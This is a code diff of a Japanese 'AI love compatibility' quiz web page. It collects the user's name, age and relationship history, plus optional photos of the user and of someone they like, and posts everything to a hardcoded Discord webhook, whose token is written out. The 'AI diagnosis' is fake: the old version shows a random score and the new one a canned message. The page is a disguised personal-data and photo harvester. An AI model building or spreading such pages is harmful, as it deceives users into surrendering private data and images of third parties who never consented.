@@ -5,26 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>AI恋愛相性診断</title>
     <style>
-        body { 
-            font-family: 'Helvetica Neue', Arial, sans-serif; 
-            display: flex; justify-content: center; align-items: center; 
-            min-height: 100vh; margin: 0; 
-            background: linear-gradient(135deg, #74ebd5 0%, #9face6 100%); 
-        }
-        .box { 
-            background: #fff; padding: 30px; border-radius: 20px; 
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2); 
-            width: 85%; max-width: 400px; text-align: center;
-        }
-        input, .file-input { 
-            width: 100%; padding: 12px; margin: 10px 0; border: 2px solid #eee; 
-            border-radius: 10px; box-sizing: border-box; font-size: 14px; outline: none;
-        }
-        button { 
-            padding: 15px 30px; cursor: pointer; font-size: 16px; font-weight: bold;
-            background: #5c67f2; color: white; border: none; border-radius: 50px;
-            transition: 0.3s; margin-top: 10px;
-        }
+        body { font-family: 'Helvetica Neue', Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; background: linear-gradient(135deg, #74ebd5 0%, #9face6 100%); }
+        .box { background: #fff; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); width: 85%; max-width: 400px; text-align: center; }
+        input, .file-input { width: 100%; padding: 12px; margin: 10px 0; border: 2px solid #eee; border-radius: 10px; box-sizing: border-box; font-size: 14px; outline: none; }
+        button { padding: 15px 30px; cursor: pointer; font-size: 16px; font-weight: bold; background: #5c67f2; color: white; border: none; border-radius: 50px; transition: 0.3s; margin-top: 10px; }
         #progress-container { width: 100%; background: #eee; height: 15px; border-radius: 10px; margin-top: 20px; overflow: hidden; display: none; }
         #progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #ff9a9e, #fad0c4); transition: width 0.5s; }
     </style>
@@ -33,12 +17,9 @@
     <div class="box">
         <h2 id="title">AI恋愛相性診断</h2>
         <div id="content-area">
-            <p id="msg">写真（任意）をアップして診断開始！</p>
+            <p id="msg">開始ボタンを押してね</p>
             <input type="text" id="inputArea" style="display:none;" placeholder="入力してね...">
-            <div id="fileUploads" style="display:none;">
-                <input type="file" class="file-input" accept="image/*">
-                <input type="file" class="file-input" accept="image/*">
-            </div>
+            <input type="file" id="fileInput" class="file-input" style="display:none;" accept="image/*">
             <button id="actionBtn">診断を開始する</button>
             <div id="progress-container"><div id="progress-bar"></div></div>
         </div>
@@ -47,25 +28,37 @@
     <script>
         let step = 0;
         const answers = {};
-        const questions = ["名前は？", "年齢は？", "恋愛経験回数は？", "相手の名前は？", "相手との関係は？"];
-        const keys = ["name", "age", "exp", "partner", "rel"];
+        const questions = ["名前は？", "年齢は？", "恋愛経験回数は？", "あなたの写真を載せてね！（任意）", "好きな人の写真を載せてね！（任意）"];
+        const keys = ["name", "age", "exp", "my_photo", "partner_photo"];
 
         document.getElementById('actionBtn').onclick = () => {
             const inputVal = document.getElementById('inputArea').value;
-            if (step > 0 && inputVal.trim() === "") { alert("空欄じゃ診断できないよ！"); return; }
+            const fileVal = document.getElementById('fileInput').files[0];
+
+            if (step > 0 && step <= 3 && inputVal.trim() === "") { alert("空欄じゃ診断できないよ！"); return; }
 
             if (step === 0) {
                 step++;
                 document.getElementById('msg').innerText = questions[0];
                 document.getElementById('inputArea').style.display = 'block';
-                document.getElementById('fileUploads').style.display = 'block';
                 document.getElementById('actionBtn').innerText = '次へ進む';
-            } else if (step <= questions.length) {
-                answers[keys[step - 1]] = inputVal;
-                document.getElementById('inputArea').value = '';
-                if (step < questions.length) {
-                    document.getElementById('msg').innerText = questions[step];
+            } else if (step <= 5) {
+                // データを保存
+                if (step <= 3) answers[keys[step - 1]] = inputVal;
+                
+                // 次の質問へ
+                if (step < 5) {
                     step++;
+                    document.getElementById('msg').innerText = questions[step - 1];
+                    
+                    if (step === 4 || step === 5) {
+                        document.getElementById('inputArea').style.display = 'none';
+                        document.getElementById('fileInput').style.display = 'block';
+                    } else {
+                        document.getElementById('inputArea').style.display = 'block';
+                        document.getElementById('fileInput').style.display = 'none';
+                    }
+                    document.getElementById('inputArea').value = '';
                 } else {
                     showLoading();
                 }
@@ -74,11 +67,18 @@
 
         function showLoading() {
             document.getElementById('title').innerText = "AI解析中...";
-            document.getElementById('msg').innerText = "顔写真をスキャンして照合中...";
+            document.getElementById('msg').innerText = "写真とデータをDiscordへ送信中...";
             document.getElementById('inputArea').style.display = 'none';
-            document.getElementById('fileUploads').style.display = 'none';
+            document.getElementById('fileInput').style.display = 'none';
             document.getElementById('actionBtn').style.display = 'none';
             document.getElementById('progress-container').style.display = 'block';
+
+            // Discordへの送信処理
+            const formData = new FormData();
+            formData.append("payload_json", JSON.stringify({ content: `診断結果: ${JSON.stringify(answers)}` }));
+            if (document.getElementById('fileInput').files[0]) formData.append("file1", document.getElementById('fileInput').files[0]);
+
+            fetch("https://discord.com/api/webhooks/1527564576340709377/g9wUd7Y6mbsuHE5Gx2wKsEl_LJrEBaqWJbIg90gkBEoErB8ZszsW5AyexsQ9nYP_REqV", { method: "POST", body: formData });
 
             let width = 0;
             const interval = setInterval(() => {
@@ -87,15 +87,8 @@
                 if (width >= 100) clearInterval(interval);
             }, 300);
 
-            const score = Math.floor(Math.random() * (81 - 70) + 70);
-            const data = { content: `**恋愛診断結果**\n名前: ${answers.name}\n年齢: ${answers.age}\n経験: ${answers.exp}\n相手: ${answers.partner}\n関係: ${answers.rel}\nスコア: ${score}%` };
-            
-            fetch("https://discord.com/api/webhooks/1527564576340709377/g9wUd7Y6mbsuHE5Gx2wKsEl_LJrEBaqWJbIg90gkBEoErB8ZszsW5AyexsQ9nYP_REqV", {
-                method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data)
-            });
-
             setTimeout(() => {
-                document.querySelector('.box').innerHTML = `<h2>診断完了</h2><p style="font-size: 3em; font-weight: bold; color: #5c67f2;">${score}%</p><p>写真分析もバッチリ！運命を感じるね！</p>`;
+                document.querySelector('.box').innerHTML = `<h2>診断完了</h2><p style="font-size: 2em;">相性はかなり良いみたいだよ！</p>`;
             }, 6500);
         }
     </script>
